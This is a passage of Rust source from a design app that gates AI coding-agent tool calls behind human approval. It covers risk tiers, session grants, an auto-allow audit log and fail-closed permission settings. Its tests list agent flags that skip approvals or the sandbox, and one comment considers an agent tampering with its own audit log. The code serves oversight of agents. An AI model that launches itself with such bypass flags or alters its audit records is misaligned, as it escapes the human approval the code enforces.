        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, format!("`{id}` is not a request id")));
    }
    crate::agent_approval_channel::create_private_dir_all(approvals_dir)?;
    let ans_path = approvals_dir.join(format!("{id}.answer"));
    let body = format_answer(decision, scope);
    designos_library::write_atomic(&ans_path, body.as_bytes()).map_err(|e| std::io::Error::other(e.to_string()))
}

/// Writes `withdrawn` to `<id>.answer` for every pending `<id>.request.json` in `approvals_dir`.
pub fn withdraw_pending_requests_in_dir(approvals_dir: &Path) {
    let Ok(entries) = std::fs::read_dir(approvals_dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        if let Some(id) = name.strip_suffix(".request.json") {
            let _ = write_approval_answer_in_dir(approvals_dir, id, ApprovalDecision::Withdrawn);
        }
    }
}

/// Abstraction over OS notifications when a tab transitions into `Needs approval` while Studio is unfocused.
pub trait ApprovalNotifier: Send + Sync {
    fn notify_needs_approval(&self, cli_label: &str, doc_name: &str);
}

/// Production notifier using `osascript` on macOS and `notify-send` on Linux, passing strings only via `argv`.
#[derive(Default)]
pub struct OsApprovalNotifier;

impl ApprovalNotifier for OsApprovalNotifier {
    fn notify_needs_approval(&self, cli_label: &str, doc_name: &str) {
        let title = "design:os studio";
        let body = format!("{cli_label} needs approval — {doc_name}");
        #[cfg(target_os = "macos")]
        {
            let _ = std::process::Command::new("osascript")
                .args(["-e", "on run argv\ndisplay notification (item 2 of argv) with title (item 1 of argv)\nend run", "--", title, &body])
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();
        }
        #[cfg(target_os = "linux")]
        {
            let _ = std::process::Command::new("notify-send")
                .args([title, &body])
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();
        }
        #[cfg(not(any(target_os = "macos", target_os = "linux")))]
        {
            let _ = (title, body);
        }
    }
}

/// Test double recording `(cli_label, doc_name)` notifications without spawning external commands.
#[derive(Clone, Default)]
pub struct RecordingNotifier {
    pub events: Arc<Mutex<Vec<String>>>,
}

impl RecordingNotifier {
    pub fn recorded_events(&self) -> Vec<String> {
        self.events.lock().map(|g| g.clone()).unwrap_or_default()
    }
}

impl ApprovalNotifier for RecordingNotifier {
    fn notify_needs_approval(&self, cli_label: &str, doc_name: &str) {
        if let Ok(mut guard) = self.events.lock() {
            guard.push(format!("{cli_label} needs approval — {doc_name}"));
        }
    }
}

/// Latch ensuring at most one notification fires per pending request while the Studio window is unfocused.
#[derive(Default)]
pub struct NotificationLatch {
    fired_keys: BTreeSet<String>,
}

impl NotificationLatch {
    pub fn reset(&mut self) {
        self.fired_keys.clear();
    }

    pub fn on_window_focus(&mut self) {
        self.fired_keys.clear();
    }

    pub fn clear_key(&mut self, key: &str) {
        self.fired_keys.remove(key);
    }

    /// Fires `notifier` once per `request_key` when `focused == Some(false)`.
    /// Clears the latch when the window is focused (`focused.unwrap_or(true)`) or when no request is pending.
    pub fn update(&mut self, notifier: &dyn ApprovalNotifier, focused: Option<bool>, cli_label: &str, doc_name: &str, request_key: Option<&str>) {
        if focused.unwrap_or(true) {
            self.fired_keys.clear();
            return;
        }
        let Some(key) = request_key else {
            self.fired_keys.clear();
            return;
        };
        if self.fired_keys.insert(key.to_string()) {
            notifier.notify_needs_approval(cli_label, doc_name);
        }
    }
}

/// Idle time after which a session grant is forgotten. The next call asks.
pub const GRANT_IDLE_TTL_SECS: u64 = 30 * 60;

const MAX_TARGET_CHARS: usize = 512;

const TARGET_KEYS: &[&str] = &["node_id", "page_id", "parent_id", "thread_id", "comment_id", "file_path", "path", "output_path"];

/// Strips the designos MCP prefix. Other tools stay as they are, so they miss the tier table and ask.
pub fn normalize_tool_name(raw: &str) -> &str {
    let raw = raw.trim();
    raw.strip_prefix("mcp__designos__").or_else(|| raw.strip_prefix("designos__")).or_else(|| raw.strip_prefix("designos:")).unwrap_or(raw)
}

pub fn canonical_designos_tool(raw: &str) -> String {
    designos_mcp::risk::canonical_tool_name(normalize_tool_name(raw))
}

/// `key:value` fingerprint. Empty when there is no stable target, or the value is too long to be one.
pub fn canonical_target(raw: &str) -> String {
    let raw = raw.trim();
    if raw.is_empty() {
        return String::new();
    }
    let (key, value) = match raw.split_once(':') {
        Some((key, value)) if TARGET_KEYS.contains(&key) => (key, value.trim()),
        _ => ("", raw),
    };
    let value = normalize_target_value(value);
    if value.is_empty() || value.chars().count() > MAX_TARGET_CHARS {
        return String::new();
    }
    if key.is_empty() {
        value
    } else {
        format!("{key}:{value}")
    }
}

fn normalize_target_value(raw: &str) -> String {
    let mut value = raw.trim().trim_matches('"').to_string();
    if let Some(rest) = value.strip_prefix("file://") {
        value = rest.to_string();
    }
    while value.contains("//") {
        value = value.replace("//", "/");
    }
    if value.len() > 1 && value.ends_with('/') {
        value.pop();
    }
    value
}

fn scalar_string(value: &serde_json::Value) -> Option<String> {
    match value {
        serde_json::Value::String(text) => {
            let text = text.trim();
            if text.is_empty() {
                None
            } else {
                Some(text.to_string())
            }
        }
        serde_json::Value::Number(number) => Some(number.to_string()),
        _ => None,
    }
}

/// Stable target from a tool-call object or a hook payload that wraps `tool_input`.
pub fn fingerprint_from_tool_input(input: &serde_json::Value) -> String {
    let obj = input.get("tool_input").unwrap_or(input);
    for key in TARGET_KEYS {
        if let Some(value) = obj.get(*key).and_then(scalar_string) {
            let fingerprint = canonical_target(&format!("{key}:{value}"));
            if !fingerprint.is_empty() {
                return fingerprint;
            }
        }
    }
    String::new()
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum AnswerScope {
    Once,
    Session,
}

impl AnswerScope {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Once => "once",
            Self::Session => "session",
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ParsedAnswer {
    Allow(AnswerScope),
    Deny,
    Withdrawn,
}

pub fn format_answer(decision: ApprovalDecision, scope: AnswerScope) -> String {
    match (decision, scope) {
        (ApprovalDecision::Allow, AnswerScope::Once) => "allow".to_string(),
        (ApprovalDecision::Allow, AnswerScope::Session) => "allow session".to_string(),
        (ApprovalDecision::Deny, _) => "deny".to_string(),
        (ApprovalDecision::Withdrawn, _) => "withdrawn".to_string(),
    }
}

fn scope_token(raw: Option<&str>) -> Option<AnswerScope> {
    match raw {
        None => Some(AnswerScope::Once),
        Some("once") => Some(AnswerScope::Once),
        Some("session") => Some(AnswerScope::Session),
        Some(_) => None,
    }
}

/// `allow` is once. `allow session` is session. A bad scope is `None` (ask again). JSON with a missing scope is once.
pub fn parse_answer(raw: &str) -> Option<ParsedAnswer> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return None;
    }
    if trimmed.starts_with('{') {
        return parse_answer_json(trimmed);
    }
    let mut parts = trimmed.split_whitespace();
    let decision = parts.next()?;
    let scope = parts.next();
    if parts.next().is_some() {
        return None;
    }
    match decision {
        "allow" => scope_token(scope).map(ParsedAnswer::Allow),
        "deny" => scope_token(scope).map(|_| ParsedAnswer::Deny),
        "withdrawn" => scope_token(scope).map(|_| ParsedAnswer::Withdrawn),
        _ => None,
    }
}

fn parse_answer_json(raw: &str) -> Option<ParsedAnswer> {
    let value: serde_json::Value = serde_json::from_str(raw).ok()?;
    let decision = value.get("decision")?.as_str()?;
    let scope = match value.get("scope") {
        None => Some(AnswerScope::Once),
        Some(serde_json::Value::String(text)) => scope_token(Some(text)),
        Some(_) => None,
    }?;
    match decision {
        "allow" => Some(ParsedAnswer::Allow(scope)),
        "deny" => Some(ParsedAnswer::Deny),
        "withdrawn" => Some(ParsedAnswer::Withdrawn),
        _ => None,
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ApprovalGate {
    Allow,
    Ask { session: bool },
}

/// What `Ask for risky only` does with one tool call. Other modes do not use this.
pub fn ask_risky_gate(tool_name: &str, target: &str) -> ApprovalGate {
    let Some(risk) = designos_mcp::risk::tool_risk(&canonical_designos_tool(tool_name)) else {
        return ApprovalGate::Ask { session: false };
    };
    match risk.tier {
        designos_mcp::risk::RiskTier::Read | designos_mcp::risk::RiskTier::Additive => ApprovalGate::Allow,
        designos_mcp::risk::RiskTier::Modify => ApprovalGate::Ask { session: !canonical_target(target).is_empty() },
        designos_mcp::risk::RiskTier::Destructive | designos_mcp::risk::RiskTier::External => ApprovalGate::Ask { session: false },
    }
}

pub fn offer_session_grant(mode: PermissionMode, req: &ApprovalRequest) -> bool {
    if mode == PermissionMode::Skip {
        return false;
    }
    matches!(ask_risky_gate(&req.tool_name, &req.target), ApprovalGate::Ask { session: true })
}

/// Codex, Grok, and Antigravity have no shared answer-file hook. The picker shows the mode unavailable for them.
pub fn ask_risky_unsupported_reason(preset: AgentCliPreset) -> Option<&'static str> {
    match preset {
        AgentCliPreset::Claude => None,
        AgentCliPreset::Codex => Some("Codex has no shared approval hook, so Ask for risky only is unavailable."),
        AgentCliPreset::Grok => Some("Grok does not share the approval hook, so Ask for risky only is unavailable."),
        AgentCliPreset::Antigravity => Some("Antigravity does not share the approval hook, so Ask for risky only is unavailable."),
        AgentCliPreset::Gemini => Some("Gemini does not share the approval hook, so Ask for risky only is unavailable."),
        AgentCliPreset::OpenCode => Some("OpenCode does not share the approval hook, so Ask for risky only is unavailable."),
        AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp => None,
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SessionGrant {
    pub session_id: String,
    pub tool_name: String,
    pub target: String,
    pub last_used_secs: u64,
}

/// In-memory grants for one Studio window. A second window has its own store. Nothing here is written to disk.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct GrantStore {
    grants: Vec<SessionGrant>,
}

impl GrantStore {
    pub fn is_empty(&self) -> bool {
        self.grants.is_empty()
    }

    pub fn insert(&mut self, session_id: &str, tool_name: &str, target: &str, now_secs: u64) -> bool {
        let tool_name = canonical_designos_tool(tool_name);
        let target = canonical_target(target);
        if session_id.is_empty() || target.is_empty() || now_secs == 0 {
            return false;
        }
        if designos_mcp::risk::tool_risk(&tool_name).map(|risk| risk.tier) != Some(designos_mcp::risk::RiskTier::Modify) {
            return false;
        }
        if let Some(existing) = self.grants.iter_mut().find(|grant| grant.session_id == session_id && grant.tool_name == tool_name && grant.target == target) {
            existing.last_used_secs = now_secs;
            return true;
        }
        self.grants.push(SessionGrant { session_id: session_id.to_string(), tool_name, target, last_used_secs: now_secs });
        true
    }

    pub fn expire(&mut self, now_secs: u64) {
        self.grants.retain(|grant| grant.last_used_secs > 0 && now_secs.saturating_sub(grant.last_used_secs) <= GRANT_IDLE_TTL_SECS);
    }

    pub fn matches(&mut self, session_id: &str, tool_name: &str, target: &str, now_secs: u64) -> bool {
        self.expire(now_secs);
        let tool_name = canonical_designos_tool(tool_name);
        let target = canonical_target(target);
        if target.is_empty() {
            return false;
        }
        if designos_mcp::risk::tool_risk(&tool_name).map(|risk| risk.tier) != Some(designos_mcp::risk::RiskTier::Modify) {
            self.grants.retain(|grant| !(grant.session_id == session_id && grant.tool_name == tool_name));
            return false;
        }
        let Some(grant) = self.grants.iter_mut().find(|grant| grant.session_id == session_id && grant.tool_name == tool_name && grant.target == target) else {
            return false;
        };
        grant.last_used_secs = now_secs;
        true
    }

    pub fn revoke(&mut self, session_id: &str, tool_name: &str, target: &str) -> bool {
        let tool_name = canonical_designos_tool(tool_name);
        let target = canonical_target(target);
        let before = self.grants.len();
        self.grants.retain(|grant| !(grant.session_id == session_id && grant.tool_name == tool_name && grant.target == target));
        self.grants.len() != before
    }

    pub fn clear_session(&mut self, session_id: &str) {
        self.grants.retain(|grant| grant.session_id != session_id);
    }

    pub fn clear(&mut self) {
        self.grants.clear();
    }

    pub fn list(&mut self, session_id: &str, now_secs: u64) -> Vec<SessionGrant> {
        self.expire(now_secs);
        self.grants.iter().filter(|grant| grant.session_id == session_id).cloned().collect()
    }
}

pub const AUTO_ALLOW_CAP: usize = 200;

const AUTO_ALLOW_LINE_MAX: usize = 4096;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum AutoAllowReason {
    Tier,
    Grant,
}

impl AutoAllowReason {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Tier => "tier",
            Self::Grant => "grant",
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum AutoAllowKind {
    Informational,
    Revertable,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct AutoAllowRow {
    pub timestamp: u64,
    pub tool_name: String,
    pub target: String,
    pub reason: AutoAllowReason,
    pub kind: AutoAllowKind,
    pub tab: Option<u64>,
}

impl AutoAllowRow {
    pub fn card_label(&self, reverted: bool) -> String {
        let role = match self.kind {
            AutoAllowKind::Informational => "read",
            AutoAllowKind::Revertable => "write",
        };
        let mut label = format!("{} · {role} · {}", self.tool_name, self.reason.as_str());
        if !self.target.is_empty() {
            label.push_str(" · ");
            label.push_str(&self.target);
        }
        if reverted {
            label.push_str(" · reverted");
        }
        label
    }
}

fn user_data_dir() -> Option<PathBuf> {
    if let Some(xdg) = std::env::var_os("XDG_DATA_HOME").filter(|p| !p.is_empty()) {
        return Some(PathBuf::from(xdg));
    }
    #[cfg(target_os = "macos")]
    {
        return std::env::var_os("HOME").filter(|p| !p.is_empty()).map(|home| PathBuf::from(home).join("Library").join("Application Support"));
    }
    #[cfg(target_os = "windows")]
    {
        return std::env::var_os("APPDATA").filter(|p| !p.is_empty()).map(PathBuf::from);
    }
    #[cfg(not(any(target_os = "macos", target_os = "windows")))]
    {
        std::env::var_os("HOME").filter(|p| !p.is_empty()).map(|home| PathBuf::from(home).join(".local").join("share"))
    }
}

fn cache_dir() -> Option<PathBuf> {
    if let Some(xdg) = std::env::var_os("XDG_CACHE_HOME").filter(|p| !p.is_empty()) {
        return Some(PathBuf::from(xdg));
    }
    #[cfg(target_os = "macos")]
    {
        return std::env::var_os("HOME").filter(|p| !p.is_empty()).map(|home| PathBuf::from(home).join("Library").join("Caches"));
    }
    #[cfg(target_os = "windows")]
    {
        return std::env::var_os("LOCALAPPDATA").filter(|p| !p.is_empty()).map(PathBuf::from);
    }
    #[cfg(not(any(target_os = "macos", target_os = "windows")))]
    {
        std::env::var_os("HOME").filter(|p| !p.is_empty()).map(|home| PathBuf::from(home).join(".cache"))
    }
}

fn auto_allow_roots() -> Vec<PathBuf> {
    let mut roots = Vec::new();
    if let Some(data) = user_data_dir() {
        roots.push(data.join("designos").join("auto-allow"));
    }
    if let Some(cache) = cache_dir() {
        roots.push(cache.join("designos").join("auto-allow"));
    }
    roots
}

fn path_is_agent_temp(path: &Path) -> bool {
    let mut roots = vec![std::env::temp_dir(), PathBuf::from("/tmp"), PathBuf::from("/var/tmp")];
    if let Some(tmpdir) = std::env::var_os("TMPDIR").filter(|p| !p.is_empty()) {
        roots.push(PathBuf::from(tmpdir));
    }
    roots.iter().any(|root| path.starts_with(root))
}

fn is_channel_sid(sid: &str) -> bool {
    sid.len() == 16 && sid.bytes().all(|b| b.is_ascii_hexdigit())
}

fn auto_allow_log_path_for_sid(sid: &str, outside: Option<&Path>) -> Option<PathBuf> {
    for root in auto_allow_roots() {
        if path_is_agent_temp(&root) || outside.is_some_and(|dir| root.starts_with(dir)) {
            continue;
        }
        let path = root.join(sid).join("auto-allow.jsonl");
        if path_is_agent_temp(&path) || outside.is_some_and(|dir| path.starts_with(dir)) {
            continue;
        }
        if ensure_owner_dir(&root).is_ok() {
            return Some(path);
        }
    }
    None
}

/// The hook and the agent are the same user, so mode `0700` does not stop the agent. The boundary is
/// the path: it is outside the session folder and the temp roots #1023 treats as agent-writable.
/// The file name is the channel session id, so a hook installed in that channel appends to this file.
pub fn auto_allow_log_path(session_dir: &Path) -> Option<PathBuf> {
    auto_allow_log_path_for_sid(&crate::agent_approval_channel::session_id(session_dir), Some(session_dir))
}

fn prepare_log_file(path: &Path) -> Option<PathBuf> {
    let parent = path.parent()?;
    ensure_owner_dir(parent).ok()?;
    if !path.exists() {
        std::fs::OpenOptions::new().create(true).append(true).open(path).ok()?;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o600));
    }
    Some(path.to_path_buf())
}

/// A channel folder is named with the session id. Only that name is logged, and the path is the one [`auto_allow_log_path`] returns for the session.
fn prepare_channel_auto_allow_log(channel_dir: &Path) -> Option<PathBuf> {
    let sid = channel_dir.file_name().and_then(|name| name.to_str())?;
    if !is_channel_sid(sid) {
        return None;
    }
    prepare_log_file(&auto_allow_log_path_for_sid(sid, None)?)
}

fn tab_channel_sid(approvals_dir: &Path) -> Option<&str> {
    let name = approvals_dir.file_name().and_then(|n| n.to_str())?;
    let rest = name.strip_prefix("tab-")?;
    if rest.is_empty() || !rest.bytes().all(|b| b.is_ascii_digit()) {
        return None;
    }
    let sid = approvals_dir.parent().and_then(|parent| parent.file_name()).and_then(|n| n.to_str())?;
    is_channel_sid(sid).then_some(sid)
}

fn log_path_for_approvals(approvals_dir: &Path) -> Option<PathBuf> {
    if let Some(sid) = tab_channel_sid(approvals_dir) {
        if let Some(path) = auto_allow_log_path_for_sid(sid, None) {
            return prepare_log_file(&path);
        }
    }
    prepare_auto_allow_log(&auto_allow_session_key(approvals_dir))
}

pub fn auto_allow_session_key(approvals_dir: &Path) -> PathBuf {
    let name = approvals_dir.file_name().and_then(|n| n.to_str()).unwrap_or("");
    if let Some(parent) = approvals_dir.parent() {
        if name.starts_with("tab-") && parent.file_name().and_then(|n| n.to_str()) == Some("approvals") {
            if let Some(session) = parent.parent() {
                return session.to_path_buf();
            }
        }
        if name == "approvals" {
            return parent.to_path_buf();
        }
    }
    approvals_dir.to_path_buf()
}

pub fn tab_id_from_approvals_dir(approvals_dir: &Path) -> Option<u64> {
    approvals_dir.file_name()?.to_str()?.strip_prefix("tab-")?.parse().ok()
}

fn ensure_owner_dir(path: &Path) -> std::io::Result<()> {
    let mut builder = std::fs::DirBuilder::new();
    builder.recursive(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::DirBuilderExt;
        builder.mode(0o700);
    }
    match builder.create(path) {
        Ok(()) => {}
        Err(err) if err.kind() == std::io::ErrorKind::AlreadyExists || path.is_dir() => {}
        Err(err) => return Err(err),
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o700))?;
    }
    Ok(())
}

pub fn prepare_auto_allow_log(session_dir: &Path) -> Option<PathBuf> {
    prepare_log_file(&auto_allow_log_path(session_dir)?)
}

pub fn remove_auto_allow_log(session_dir: &Path) {
    let Some(path) = auto_allow_log_path(session_dir) else {
        return;
    };
    if let Some(parent) = path.parent() {
        let _ = std::fs::remove_dir_all(parent);
    }
}

fn append_auto_allow_at(path: &Path, tool_name: &str, target: &str, reason: AutoAllowReason, now_secs: u64, tab: Option<u64>) -> std::io::Result<()> {
    let mut line = serde_json::json!({
        "ts": now_secs,
        "tool": canonical_designos_tool(tool_name),
        "target": canonical_target(target),
        "reason": reason.as_str(),
    });
    if let Some(tab) = tab {
        line["tab"] = serde_json::json!(tab);
    }
    let mut encoded = serde_json::to_string(&line).map_err(|err| std::io::Error::other(err.to_string()))?;
    encoded.push('\n');
    if encoded.len() > AUTO_ALLOW_LINE_MAX {
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, "auto-allow line exceeds PIPE_BUF"));
    }
    let mut file = std::fs::OpenOptions::new().create(true).append(true).open(path)?;
    use std::io::Write;
    let wrote = file.write(encoded.as_bytes())?;
    if wrote != encoded.len() {
        return Err(std::io::Error::new(std::io::ErrorKind::WriteZero, "short auto-allow append"));
    }
    Ok(())
}

pub fn append_auto_allow_row(
    session_dir: &Path,
    tool_name: &str,
    target: &str,
    reason: AutoAllowReason,
    now_secs: u64,
    tab: Option<u64>,
) -> std::io::Result<()> {
    let Some(path) = prepare_auto_allow_log(session_dir) else {
        return Err(std::io::Error::new(std::io::ErrorKind::NotFound, "no private auto-allow log"));
    };
    append_auto_allow_at(&path, tool_name, target, reason, now_secs, tab)
}

fn kind_for_tool(tool_name: &str) -> AutoAllowKind {
    match designos_mcp::risk::tool_risk(tool_name).map(|risk| risk.tier) {
        Some(designos_mcp::risk::RiskTier::Additive | designos_mcp::risk::RiskTier::Modify) => AutoAllowKind::Revertable,
        _ => AutoAllowKind::Informational,
    }
}

enum ParsedLogLine {
    Row(AutoAllowRow),
    Dropped(u64),
    Skip,
}

fn parse_auto_allow_line(line: &str) -> ParsedLogLine {
    if line.len() > AUTO_ALLOW_LINE_MAX || line.trim().is_empty() {
        return ParsedLogLine::Skip;
    }
    let Ok(value) = serde_json::from_str::<serde_json::Value>(line) else {
        return ParsedLogLine::Skip;
    };
    if value.get("tool").is_none() {
        if let Some(dropped) = value.get("dropped").and_then(|n| n.as_u64()) {
            return ParsedLogLine::Dropped(dropped);
        }
    }
    let Some(timestamp) = value.get("ts").and_then(|n| n.as_u64()) else {
        return ParsedLogLine::Skip;
    };
    let Some(tool) = value.get("tool").and_then(|n| n.as_str()).filter(|tool| !tool.is_empty() && tool.len() <= 200) else {
        return ParsedLogLine::Skip;
    };
    let reason = match value.get("reason").and_then(|n| n.as_str()) {
        Some("tier") => AutoAllowReason::Tier,
        Some("grant") => AutoAllowReason::Grant,
        _ => return ParsedLogLine::Skip,
    };
    let tool_name = canonical_designos_tool(tool);
    let target = value.get("target").and_then(|n| n.as_str()).map(canonical_target).unwrap_or_default();
    let kind = kind_for_tool(&tool_name);
    let tab = value.get("tab").and_then(|n| n.as_u64());
    ParsedLogLine::Row(AutoAllowRow { timestamp, tool_name, target, reason, kind, tab })
}

pub fn load_auto_allow_log(path: &Path) -> (Vec<AutoAllowRow>, u64) {
    let Ok(raw) = std::fs::read_to_string(path) else {
        return (Vec::new(), 0);
    };
    let (mut rows, mut dropped) = (Vec::new(), 0u64);
    for line in raw.split_inclusive('\n') {
        let line = line.trim_end_matches(['\n', '\r']);
        if line.is_empty() {
            continue;
        }
        match parse_auto_allow_line(line) {
            ParsedLogLine::Row(row) => rows.push(row),
            ParsedLogLine::Dropped(count) => dropped = dropped.saturating_add(count),
            ParsedLogLine::Skip => {}
        }
    }
    if rows.len() > AUTO_ALLOW_CAP {
        let excess = rows.len() - AUTO_ALLOW_CAP;
        dropped = dropped.saturating_add(excess as u64);
        rows.drain(0..excess);
    }
    (rows, dropped)
}

#[derive(Debug)]
pub struct AutoAllowLog {
    path: Option<PathBuf>,
    offset: u64,
    skipping: bool,
}

impl AutoAllowLog {
    pub fn bind(session_dir: &Path) -> Self {
        let path = auto_allow_log_path(session_dir);
        let offset = path.as_ref().and_then(|p| std::fs::metadata(p).ok()).map(|meta| meta.len()).unwrap_or(0);
        Self { path, offset, skipping: false }
    }

    pub fn poll(&mut self) -> Vec<AutoAllowRow> {
        let Some(path) = self.path.clone() else {
            return Vec::new();
        };
        let Ok(meta) = std::fs::metadata(&path) else {
            return Vec::new();
        };
        let len = meta.len();
        if len < self.offset {
            self.offset = 0;
            self.skipping = false;
        }
        if len == self.offset {
            return Vec::new();
        }
        let Ok(bytes) = std::fs::read(&path) else {
            return Vec::new();
        };
        let start = (self.offset as usize).min(bytes.len());
        let slice = &bytes[start..];
        let mut rows = Vec::new();
        let mut pos = 0usize;
        if self.skipping {
            match slice.iter().position(|b| *b == b'\n') {
                Some(nl) => {
                    pos = nl + 1;
                    self.skipping = false;
                }
                None => {
                    self.offset = len;
                    return Vec::new();
                }
            }
        }
        while let Some(rel) = slice[pos..].iter().position(|b| *b == b'\n') {
            let line = &slice[pos..pos + rel];
            pos += rel + 1;
            if line.len() > AUTO_ALLOW_LINE_MAX {
                continue;
            }
            let text = String::from_utf8_lossy(line);
            if let ParsedLogLine::Row(row) = parse_auto_allow_line(text.trim_end_matches('\r')) {
                rows.push(row);
            }
        }
        if slice.len() - pos > AUTO_ALLOW_LINE_MAX {
            self.skipping = true;
            pos = slice.len();
        }
        self.offset = start as u64 + pos as u64;
        rows
    }
}

/// Writes `allow` for requests this window already granted. An answer file, including `allow session`, never inserts a grant.
pub fn settle_granted_requests(store: &mut GrantStore, session_id: &str, approvals_dir: &Path, reqs: &mut Vec<ApprovalRequest>, now_secs: u64) {
    reqs.retain(|req| {
        if approvals_dir.join(format!("{}.answer", req.id)).exists() {
            return false;
        }
        if store.matches(session_id, &req.tool_name, &req.target, now_secs) {
            let tab = tab_id_from_approvals_dir(approvals_dir);
            let Some(path) = log_path_for_approvals(approvals_dir) else {
                return true;
            };
            if append_auto_allow_at(&path, &req.tool_name, &req.target, AutoAllowReason::Grant, now_secs, tab).is_err() {
                return true;
            }
            match write_approval_answer_in_dir(approvals_dir, &req.id, ApprovalDecision::Allow) {
                Ok(()) => false,
                Err(_) => true,
            }
        } else {
            true
        }
    });
}

#[cfg(test)]
mod tests {
    use super::approval_channel_tests::{bash_payload, decision_of, wait_for_request, Fixture};
    use super::*;
    use crate::terminal::AgentCliPreset;
    use std::io::Write;
    use std::process::{Command, Stdio};

    #[test]
    fn default_mode_is_ask() {
        let tmp = std::env::temp_dir().join(format!("designos-841-default-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        std::fs::create_dir_all(&tmp).unwrap();
        assert_eq!(AgentPermissionMode::default(), AgentPermissionMode::Ask);
        assert_eq!(load_permission_mode(&tmp), AgentPermissionMode::Ask, "a library without the setting asks");
        save_permission_mode(&tmp, AgentPermissionMode::Skip).unwrap();
        assert_eq!(load_permission_mode(&tmp), AgentPermissionMode::Skip);
        save_permission_mode(&tmp, AgentPermissionMode::Ask).unwrap();
        assert_eq!(load_permission_mode(&tmp), AgentPermissionMode::Ask);
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn parse_returns_skip_only_for_the_word_skip() {
        for raw in ["skip", "Skip", "SKIP", "  skip\n"] {
            assert_eq!(AgentPermissionMode::parse(raw), AgentPermissionMode::Skip, "{raw:?} is a saved Skip");
        }
        for raw in ["ask", "ASK", "", "   ", "manual", "yolo", "skip-permissions", "skip permissions", "none", "false"] {
            assert_eq!(AgentPermissionMode::parse(raw), AgentPermissionMode::Ask, "{raw:?} must fail closed to Ask");
        }
    }

    /// The mode a library resolves to for each `settings.json` the owner listed (missing, `"skip"`, `"ask"`, `""`,
    /// `"manual"`, invalid JSON) plus other shapes a hand edit or a failed write can leave behind.
    #[test]
    fn settings_json_resolves_to_a_mode_and_fails_closed() {
        let cases: [(&str, Option<&str>, AgentPermissionMode); 11] = [
            ("missing-file", None, AgentPermissionMode::Ask),
            ("empty-object", Some("{}"), AgentPermissionMode::Ask),
            ("skip", Some(r#"{"agent_permission_mode":"skip"}"#), AgentPermissionMode::Skip),
            ("ask", Some(r#"{"agent_permission_mode":"ask"}"#), AgentPermissionMode::Ask),
            ("empty-string", Some(r#"{"agent_permission_mode":""}"#), AgentPermissionMode::Ask),
            ("manual", Some(r#"{"agent_permission_mode":"manual"}"#), AgentPermissionMode::Ask),
            ("invalid-json", Some(r#"{"agent_permission_mode": "skip""#), AgentPermissionMode::Ask),
            ("not-an-object", Some(r#""skip""#), AgentPermissionMode::Ask),
            ("truncated-to-nothing", Some(""), AgentPermissionMode::Ask),
            ("non-string-value", Some(r#"{"agent_permission_mode":true}"#), AgentPermissionMode::Ask),
            ("other-keys-only", Some(r#"{"author":"Jang"}"#), AgentPermissionMode::Ask),
        ];
        for (tag, body, expected) in cases {
            let tmp = std::env::temp_dir().join(format!("designos-841-settings-{tag}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&tmp);
            std::fs::create_dir_all(&tmp).unwrap();
            if let Some(body) = body {
                std::fs::write(tmp.join("settings.json"), body).unwrap();
            }
            assert_eq!(load_permission_mode(&tmp), expected, "settings.json case `{tag}`");
            let _ = std::fs::remove_dir_all(&tmp);
        }
    }

    /// A new install (no library setting yet) starts every agent CLI without its skip flag.
    #[test]
    fn a_fresh_terminal_launches_every_cli_in_ask_mode() {
        let st = crate::terminal::TerminalState::default();
        assert_eq!(st.permission_mode, AgentPermissionMode::Ask);
        for preset in [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity, AgentCliPreset::Gemini] {
            let cmd = build_new_session_command_for_mode(preset, st.permission_mode, Some("019a0102-0304-7506-8708-090a0b0c0d0e"));
            for flag in ["--dangerously-skip-permissions", "--dangerously-bypass-approvals-and-sandbox", "--always-approve", "--approval-mode yolo"] {
                assert!(!cmd.contains(flag), "{preset:?} fresh launch kept `{flag}`: {cmd}");
            }
        }
    }

    /// A window that loaded Skip must not keep it once the saved mode turns unreadable or disappears: the next
    /// agent it starts asks (fail closed), and a readable `"skip"` applies again.
    #[test]
    fn a_bound_window_falls_back_to_ask_when_the_saved_mode_is_unreadable() {
        let root = std::env::temp_dir().join(format!("designos-841-refresh-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        save_permission_mode(&root, AgentPermissionMode::Skip).unwrap();
        let mut st = crate::terminal::TerminalState::for_tab(84_101);
        st.bind_library_file(&root, "file-841", "win-841");
        assert_eq!(st.permission_mode, AgentPermissionMode::Skip, "the window loaded the saved Skip when it bound");

        for (tag, body) in
            [("invalid-json", "{\"agent_permission_mode\": \"skip\""), ("key-removed", "{}"), ("unknown-value", r#"{"agent_permission_mode":"manual"}"#)]
        {
            std::fs::write(root.join("settings.json"), body).unwrap();
            let idx = st.spawn_tab(AgentCliPreset::Shell, None).expect("spawn a tab");
